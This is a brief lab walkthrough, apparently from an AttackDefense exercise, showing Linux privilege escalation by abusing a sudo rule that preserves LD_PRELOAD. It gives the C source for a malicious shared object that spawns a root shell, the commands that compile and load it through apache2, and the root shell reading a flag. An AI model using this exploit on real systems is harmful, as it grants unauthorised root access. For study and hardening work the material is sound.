## privesc abusing Sudo (LD_PRELOAD)

    noobuser@attackdefense:~$ id
    uid=999(noobuser) gid=999(noobuser) groups=999(noobuser)
    
    noobuser@attackdefense:~$ sudo -l
    Matching Defaults entries for noobuser on attackdefense:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
        env_keep+=LD_PRELOAD
    User noobuser may run the following commands on attackdefense:
        (root) NOPASSWD: /usr/sbin/apache2

then write C program in the writtable directory such as /var/tmp , /dev/shm and /tmp directory and save it to LD_PRELOAD_privesc.c

> #include <stdio.h>
> #include <sys/types.h>
> #include <stdlib.h> 
> void _init() { 
> unsetenv("LD_PRELOAD"); 
> setgid(0); 
> setuid(0); 
> system("/bin/bash"); 
> }

then compile the file and generate the object file

    noobuser@attackdefense:~$ /usr/bin/gcc -fPIC -shared -o LD_PRELOAD_privesc.so LD_PRELOAD_privesc.c -nostartfiles
    noobuser@attackdefense:~$ sudo LD_PRELOAD=/tmp/LD_PRELOAD_privesc.so /usr/sbin/apache2
    root@attackdefense:/tmp# id
    uid=0(root) gid=0(root) groups=0(root)
    
    root@attackdefense:/tmp# find /root/ type f -name flag
    /root/flag
    find: 'type': No such file or directory
    find: 'f': No such file or directory
    
    root@attackdefense:/tmp# cat /root/flag
    368b21993<snip>1ac697cc83
    
    root@attackdefense:/tmp# yeayy


